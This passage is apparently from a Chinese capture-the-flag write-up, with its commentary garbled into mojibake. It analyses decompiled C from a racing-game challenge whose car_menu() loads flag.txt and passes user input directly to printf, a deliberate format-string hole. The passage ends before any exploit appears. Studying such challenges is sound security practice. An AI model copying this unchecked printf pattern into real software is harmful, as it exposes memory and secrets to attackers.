class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int menu()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v1; // [esp+0h] [ebp-18h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v2; // [esp+4h] [ebp-14h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v3; // [esp+8h] [ebp-10h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  do&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    printf(&amp;quot;\n1. Car info\n2. Car selection\n&amp;gt; &amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v3 = read_int(v1, v2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if ( v3 != 2 &amp;amp;&amp;amp; v3 != 1 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      printf(&amp;quot;\n%s[-] Invalid choice!%s\n&amp;quot;, &amp;quot;\x1B[1;31m&amp;quot;, &amp;quot;\x1B[1;36m&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  while ( v3 != 2 &amp;amp;&amp;amp; v3 != 1 );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return v3;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;v3 ç­‰äºäº† read_int (v1,v2)&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹ read_int&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int read_int()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char buf[32]; // [esp+Ch] [ebp-2Ch] BYREF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  unsigned int v2; // [esp+2Ch] [ebp-Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 = __readgsdword(0x14u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  read(0, buf, 0x1Fu);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return atoi(buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥ v3 ç­‰äºç”¨æˆ·è¾“å…¥çš„æ•°ï¼Œæœ€å¤§ä¸º 0x1f ä¹Ÿå°±æ˜¯ 31&lt;/p&gt;
&lt;p&gt;ç°åœ¨å°±çœ‹ v3 å€¼ä¸ºå¤šå°‘äº†&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;v3 = menu();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if ( v3 == 1 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  car_info();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;else if ( v3 == 2 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  check = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  car_menu();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;else&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  printf(&amp;quot;\n%s[-] Invalid choice!%s\n&amp;quot;, &amp;quot;\x1B[1;31m&amp;quot;, &amp;quot;\x1B[1;36m&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;å¦‚æœ v3 ç­‰äº 1 è°ƒç”¨ car_info ()&lt;/p&gt;
&lt;p&gt;å¦‚æœ v3 ç­‰äº 2 è°ƒç”¨ car_menu () å¹¶ä¸” check=0 åœæ­¢å¾ªç¯&lt;/p&gt;
&lt;p&gt;å…ˆçœ‹ car_info () å‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆå†…å®¹åªæ˜¯è¿›è¡Œäº†è¾“å‡º&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;unsigned int car_info()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  unsigned int v1; // [esp+Ch] [ebp-Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1 = __readgsdword(0x14u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  puts(asc_1BB0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  puts(aCar1Stats);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  printf(aSpeedS, &amp;quot;\x1B[1;31m&amp;quot;, &amp;quot;\x1B[1;33m&amp;quot;, &amp;quot;\x1B[1;36m&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  printf(aAccelerationS, &amp;quot;\x1B[1;31m&amp;quot;, &amp;quot;\x1B[1;33m&amp;quot;, &amp;quot;\x1B[1;36m&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  printf(aHandlingS, &amp;quot;\x1B[1;31m&amp;quot;, &amp;quot;\x1B[1;33m&amp;quot;, &amp;quot;\x1B[1;32m&amp;quot;, &amp;quot;\x1B[1;36m&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  puts(asc_1BB0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  puts(aCar2Stats);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  printf(aSpeedS_0, &amp;quot;\x1B[1;31m&amp;quot;, &amp;quot;\x1B[1;33m&amp;quot;, &amp;quot;\x1B[1;32m&amp;quot;, &amp;quot;\x1B[1;36m&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  printf(aAccelerationS_0, &amp;quot;\x1B[1;31m&amp;quot;, &amp;quot;\x1B[1;33m&amp;quot;, &amp;quot;\x1B[1;32m&amp;quot;, &amp;quot;\x1B[1;36m&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  printf(aHandlingS_0, &amp;quot;\x1B[1;31m&amp;quot;, &amp;quot;\x1B[1;36m&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  puts(asc_1BB0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  return __readgsdword(0x14u) ^ v1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹ car_menu () çœ‹åˆ°äº†&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;int car_menu()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  unsigned int v0; // eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size_t i; // eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size_t v2; // edx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int result; // eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v4; // [esp+0h] [ebp-58h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v5; // [esp+0h] [ebp-58h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v6; // [esp+4h] [ebp-54h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v7; // [esp+4h] [ebp-54h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  unsigned int v8; // [esp+8h] [ebp-50h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v9; // [esp+Ch] [ebp-4Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  int v10; // [esp+10h] [ebp-48h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  void *buf; // [esp+18h] [ebp-40h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  FILE *stream; // [esp+1Ch] [ebp-3Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char v13[44]; // [esp+20h] [ebp-38h] BYREF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  unsigned int v14; // [esp+4Ch] [ebp-Ch]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v14 = __readgsdword(0x14u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v4 = -1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v6 = -1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  do&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    printf(aSelectCar1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v9 = read_int(v4, v6);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if ( v9 != 2 &amp;amp;&amp;amp; v9 != 1 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      printf(&amp;quot;\n%s[-] Invalid choice!%s\n&amp;quot;, &amp;quot;\x1B[1;31m&amp;quot;, &amp;quot;\x1B[1;36m&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  while ( v9 != 2 &amp;amp;&amp;amp; v9 != 1 );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v10 = race_type();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v0 = time(0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  srand(v0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  if ( v9 == 1 &amp;amp;&amp;amp; v10 == 2 || v9 == 2 &amp;amp;&amp;amp; v10 == 2 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v5 = rand() % 10;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v7 = rand() % 100;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  else if ( v9 == 1 &amp;amp;&amp;amp; v10 == 1 || v9 == 2 &amp;amp;&amp;amp; v10 == 1 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v5 = rand() % 100;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v7 = rand() % 10;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  else&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v5 = rand() % 100;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v7 = rand() % 100;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v8 = 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  for ( i = strlen(&amp;quot;\n[*] Waiting for the race to finish...&amp;quot;); ; i = strlen(&amp;quot;\n[*] Waiting for the race to finish...&amp;quot;) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v2 = i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    result = v8;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if ( v2 &amp;lt;= v8 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      break;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    putchar(aWaitingForTheR[v8]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if ( aWaitingForTheR[v8] == 46 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      sleep(0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ++v8;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  if ( v9 == 1 &amp;amp;&amp;amp; (result = v5, v5 &amp;lt; v7) || v9 == 2 &amp;amp;&amp;amp; (result = v5, v5 &amp;gt; v7) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    printf(&amp;quot;%s\n\n[+] You won the race!! You get 100 coins!\n&amp;quot;, &amp;quot;\x1B[1;32m&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    coins += 100;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    printf(&amp;quot;[+] Current coins: [%d]%s\n&amp;quot;, coins, &amp;quot;\x1B[1;36m&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    printf(&amp;quot;\n[!] Do you have anything to say to the press after your big victory?\n&amp;gt; %s&amp;quot;, &amp;quot;\x1B[0m&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    buf = malloc(0x171u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    stream = fopen(&amp;quot;flag.txt&amp;quot;, &amp;quot;r&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if ( !stream )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      printf(&amp;quot;%s[-] Could not open flag.txt. Please contact the creator.\n&amp;quot;, &amp;quot;\x1B[1;31m&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      exit(105);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fgets(v13, 44, stream);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    read(0, buf, 0x170u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    puts(&amp;quot;\n\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \x1B[0m&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return printf((const char *)buf);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  else if ( v9 == 1 &amp;amp;&amp;amp; (result = v5, v5 &amp;gt; v7) || v9 == 2 &amp;amp;&amp;amp; (result = v5, v5 &amp;lt; v7) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    